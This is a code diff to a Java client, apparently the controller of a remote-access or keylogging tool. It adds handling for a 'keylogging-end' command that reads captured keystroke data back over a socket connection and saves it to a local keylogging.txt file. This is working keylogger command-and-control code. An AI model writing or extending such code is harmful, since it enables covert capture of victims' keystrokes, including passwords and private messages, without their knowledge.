@@ -99,6 +99,22 @@ public class Client {
                     case 6:
                         writer.println("keylogging-end");
                         writer.flush();
+
+                        String res = reader.readLine();
+                        byte[] bytes = res.getBytes();
+                        String fileAddress = Paths.get("").toAbsolutePath().toString() + "/";
+                        System.out.println(fileAddress);
+
+                        Path filePathLoggingChecker = Paths.get(fileAddress);
+                        Path filePathLogging = Paths.get(fileAddress + "/keylogging.txt");
+
+                        if (Files.isDirectory(filePathLoggingChecker.getParent()) && Files.isWritable(filePathLoggingChecker)) {
+                            Files.write(filePathLogging, bytes);
+                            System.out.println("A new file has been added to: " + fileAddress);
+                        } else {
+                            System.out.println("Invalid file address or write permissions denied.");
+                        }
+
                         break;
 
                     default:
